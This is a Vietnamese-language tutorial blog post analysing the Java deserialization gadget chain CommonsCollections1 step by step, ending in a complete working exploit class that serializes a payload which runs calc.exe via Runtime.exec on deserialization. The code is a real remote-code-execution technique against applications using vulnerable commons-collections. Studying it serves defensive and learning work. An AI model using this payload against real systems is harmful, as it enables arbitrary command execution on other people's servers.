---
title: Lỗ hổng Java Deserialization - Phần 3.1 - Phân tích CommonsCollections1
date: 2023-11-24 00:15:00 +0700
categories: [Java]
tags: [deserialization]     # TAG names should always be lowercase
img_path: /assets/img/JavaDeserializationP3
---

**Gadget Chain**
```
ObjectInputStream.readObject()
  AnnotationInvocationHandler.readObject()
    Map(Proxy).entrySet()
      AnnotationInvocationHandler.invoke()
        LazyMap.get()
          ChainedTransformer.transform()
            ConstantTransformer.transform()
            InvokerTransformer.transform()
              Method.invoke()
                Class.getMethod()
            InvokerTransformer.transform()
              Method.invoke()
                Runtime.getRuntime()
            InvokerTransformer.transform()
              Method.invoke()
                Runtime.exec()
```
## Setup
- `jdk1.8.0_65`
- `commons-collections` version `3.2.1` (add vào `pom.xml`)
## Phân tích
### ChainedTransformer#transform()
Ta sẽ phân tích từ nửa chain cuối trước:
```
ChainedTransformer.transform()
  ConstantTransformer.transform()
  InvokerTransformer.transform()
    Method.invoke()
      Class.getMethod()
  InvokerTransformer.transform()
    Method.invoke()
      Runtime.getRuntime()
  InvokerTransformer.transform()
    Method.invoke()
      Runtime.exec()
```
Lib CommonsCollections chứa nhiều class `Transformer` và thường bị lợi dụng để xây dựng gadget chain như trên. (Nó cũng xuất hiện trong **CC5**)

![Alt text](image-2.png)

Đây là đoạn code `ChainedTransformer#transform()`

![Alt text](image-1.png)

`iTransformers` là một mảng có kiểu dữ liệu là `Transformer` nên sẽ có thể đưa vào được nhiều phần từ từ class kế thừ `Transformer` như ở đây là: `ConstantTransformer`, `InvokerTransformer`.
Nhìn vào vòng lặp trên, các phần tử của mảng thực thi `transform()` của nó với tham số truyền vào từ kết quả vòng lặp trước.

#### Vòng lặp đầu tiên: `ConstantTransformer#transform()`

![Alt text](image-3.png)

`input` sẽ do ta kiểm soát vậy mục đích của `ConstantTransformer#transform()` mới chỉ là mở đầu cho các vòng lặp sau.

Payload tạo đối tượng này là:
```java
new ConstantTransformer(Runtime.class)
```

>Kết quả trả về ở đây là class `Runtime` (`class java.lang.Runtime`)
{: .prompt-info }

#### Vòng lặp thứ 2: `InvokerTransformer#transform()`

![Alt text](image-4.png)

Nhìn vào trên dễ thấy được việc sử dụng Reflection để thực thi method.

Ở đây ta sẽ xây dựng `Runtime#getRuntime()`

Đây là `constructor` của `InvokerTransformer`:

![Alt text](image-8.png)

Ta sẽ dùng Refection ở đây là `Class#getMethod(String name, Class<?>... parameterTypes)`, khi đó:

- `iMethodName` là `getMethod`
- `iParamTypes` là `String.class` (`new Class[] {String.class, Class[].class }`)
- `iArgs` là `getRuntime` (`new Object[] {"getRuntime", null}`)

Payload tạo object này là:
```java
new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", null})
```

#### Vòng lặp thứ 3: `InvokerTransformer#transform()`

Tiếp tục sử dụng Reflection `Method#invoke(Object obj, Object... args)`

Payload tạo object này:
```java
new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, null })
```
Vòng lặp này sử dụng `invoke` để gọi `invoke` khác hmm... ( ´･･)ﾉ(._.`)
#### Vòng lặp thứ 4: `InvokerTransformer#transform()`

Ta sẽ xây dựng `Runtime.getRuntime().exec("calc.exe")`

Payload tạo object này:
```java
new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
```

>Đến đây chain dẫn đến RCE hoàn tất.
{: .prompt-info }

Payload của chain:
```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

### LazyMap#get()
Quay trởi lại phần đầu của chain:
```
ObjectInputStream.readObject()
    AnnotationInvocationHandler.readObject()
      Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
          LazyMap.get()
```
Để thực thi `ChainedTransformer.transform()`, ta thấy trong class `LazyMap` có method `get()` có thể gọi `transform()`:

![lazymap](image-9.png)

`this.factory` phải là object của class `ChainedTransformer`.<br>
Mà ở trong class LazyMap này constructor nó có modifier là `protect` vì vậy không thể dùng nó để tạo object, thay vào đó ta có method `decorate()`:

![decorate](image-10.png)

Payload làm điều trên:
```java
Map lazyMap = LazyMap.decorate(new LinkedHashMap(), chainedTransformer);
```
> Ở trên không nhất thiết tạo obj từ class `LinkedHashMap` mà bất kỳ class nào implements từ `Map` là được.
{: .prompt-info }

Khi đó ta có thể gọi `lazyMap.get()` để kiểm tra chain có hoạt động không và kết quả:

![Alt text](image-14.png)

#### AnnotationInvocationHandler#invoke()

![Alt text](image-11.png)

method này sẽ gọi đến `LazyMap#get()` khi giá trị `this.memberValues` là object của`LazyMap` đồng thời thỏa mãn điều kiện: `var4` đi vào case `default`.

Constructor của `AnnotationInvocationHandler`:

![AnnotationInvocationHandlerConstructor](image-12.png)

Tức là `var2` là object của class `LazyMap`. Class `AnnotationInvocationHandler` không phải là class `public` nên không thể tạo trực tiếp bằng cách thông thường như việc dùng từ khóa `new`, ta cần tạo nó qua Reflection. Payload sẽ để tạo:
```java
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = cls.getDeclaredConstructors()[0];
constructor.setAccessible(true);
InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class,lazyMap);
```
>Sử dụng `Override.class` vì nó sẽ thỏa mản điều kiện `Override.class.getInterfaces()[0] == Annotation.class` trong constructor.
{: .prompt-info }

Object `invocationHandler` đã được tạo bên trên và bây giờ cần tìm cách để thực thi method `invoke()` của nó.

Ta sẽ dựa vào **dynamic proxy**.
>Proxy ở đây khác với proxy trong network, tuy nhiên bản chất cũng khá giống nhau. Thay vì gọi method từ object ta có thể gọi qua proxy của object đó.
> Refs: 
>- <https://www.baeldung.com/java-dynamic-proxies>
>- <https://viblo.asia/p/class-proxy-trong-java-va-cac-ung-dung-yMnKMYvgK7P>
{: .prompt-tip }

`AnnotationInvocationHandler` là class implements từ interface `InvocationHandler`. Object tạo từ interface này sẽ chịu trách nhiệm xử lý việc gọi method thực hiện trên proxy object. Tóm lại điều quan trọng ở đây là **nếu object proxy thực thi bất kỳ method nào thì object của `InvocationHandler` sẽ thực thi method `invoke()` của nó**.

Để tạo dynamic proxy:

![dynamicproxy](image-13.png)

Ở đây ta cần gọi đến `invocationHandler.invoke()` nghĩa là `invocationHandler` được tạo từ reflection ở trên sẽ truyền vào đối số thứ 3 của constructor trên.

Ở đây cần tạo proxy cho object của `Map` (theo như chain), ta có thể dùng `HashMap`.

Payload tạo dynamic proxy:
```java
Map hashMap = new HashMap();
Map dynamicProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),hashMap.getClass().getInterfaces(),invocationHandler);
```

Khi đó `dynamicProxy` thực thi method bất kỳ thì `invocationHandler.invoke()` cũng thực thi.<br>
Kiểm tra chain:

![Alt text](image-15.png)

Giờ cần tìm cách để cho nó gọi method bất kỳ, ta có:
`AnnotationInvocationHandler#readObject()`

Vào method `readObject()`, ta sẽ nhờ vào `this.memberValues.entrySet()`:

![Alt text](image-16.png)

Vậy `this.memberValues.entrySet()` là proxy object trên là được. Để tạo object của class `AnnotationInvocationHandler` cũng tương tự như trên:

```java
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, dynamicProxy);
```
Như vậy nếu deserialize objet `handler` (`AnnotationInvocationHandler#readObject()`) này sẽ thì sẽ thực thi `calc.exe`.

Full payload:
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new LinkedHashMap(), chainedTransformer);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class,lazyMap);
        Map map = new HashMap();
        Map dynamicProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),map.getClass().getInterfaces(),invocationHandler);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, dynamicProxy);
        try (ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("test.ser"))) {
            out.writeObject(handler);
        }
        try (ObjectInputStream in = new ObjectInputStream(new FileInputStream("test.ser"))) {
            in.readObject();
        }
    }
}
```
Vậy là xong **CC1**, do mới học nên có thể còn nhiều sai sót mong được mọi người góp ý. <br> ༼ つ ◕_◕ ༽つ

## Refs
- <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java>
- <https://hackmd.io/@vanirxxx-java/BJYmd7hms>
- <https://blog.csdn.net/m0_62770485/article/details/128187326>
- <https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-1.html>
